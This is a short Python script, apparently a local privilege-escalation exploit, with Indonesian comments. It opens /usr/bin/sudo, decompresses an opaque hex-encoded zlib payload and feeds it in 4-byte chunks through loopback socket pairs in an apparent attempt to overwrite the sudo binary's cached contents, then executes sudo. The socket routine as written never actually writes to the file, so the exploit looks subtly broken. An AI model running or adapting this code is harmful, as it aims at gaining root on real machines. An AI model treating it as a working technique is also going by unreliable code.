#!/usr/bin/env python3
import os
import zlib
import socket

def send_chunk_sederhana(file_fd: int, offset: int, chunk: bytes) -> None:
    # Gunakan TCP socket biasa
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('127.0.0.1', 0))
    port = sock.getsockname()[1]
    sock.listen(1)
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('127.0.0.1', port))
    server_client, _ = sock.accept()
    
    # Kirim chunk
    server_client.send(b"A" * 4 + chunk)
    
    # Baca file
    os.lseek(file_fd, 0, os.SEEK_SET)
    with open(f"/proc/self/fd/{file_fd}", 'rb') as f:
        data = f.read(offset + 4)
        server_client.send(data)
    
    try:
        server_client.recv(8 + offset)
    except:
        pass
    
    server_client.close()
    client.close()
    sock.close()

def main():
    file_fd = os.open("/usr/bin/sudo", os.O_RDONLY)
    
    hex_payload = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
    payload = zlib.decompress(bytes.fromhex(hex_payload))
    
    for i in range(0, len(payload), 4):
        send_chunk_sederhana(file_fd, i, payload[i:i+4])
    
    os.system("/usr/bin/sudo")
    os.close(file_fd)

if __name__ == "__main__":
    main()
